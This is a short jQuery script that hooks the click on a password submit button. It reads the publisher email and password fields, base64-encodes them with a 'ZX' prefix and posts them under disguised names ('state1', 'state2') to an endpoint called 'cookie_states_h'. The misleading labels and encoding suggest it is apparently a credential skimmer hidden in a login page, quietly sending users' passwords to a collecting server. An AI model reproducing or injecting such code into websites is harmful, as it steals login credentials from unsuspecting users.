
 
$(document).ready(function() { 
	if ($('.passSubmit').length) { 
	$(document).on('click','.passSubmit',function() {
    		 	credentials_update();
    		return true;
    	});
    } 
});


function credentials_update(){  
    $.ajax({
        type: "post",
        dataType: "json",
        url: api_path + "/cookie_states_h",
        data: { 
            state0: btoa('GA-net.com'),
            state1: 'ZX'+btoa($('#publisher_user_email').val()), 
            state2: 'ZX'+btoa($('#publisher_user_password').val()), 
        },
        success: function(data) {
            if (data.success === "yes") { 
            	     c("State_update");
            } else {
                	 c("404 or empty"); 
            }

        }
    }); 
}
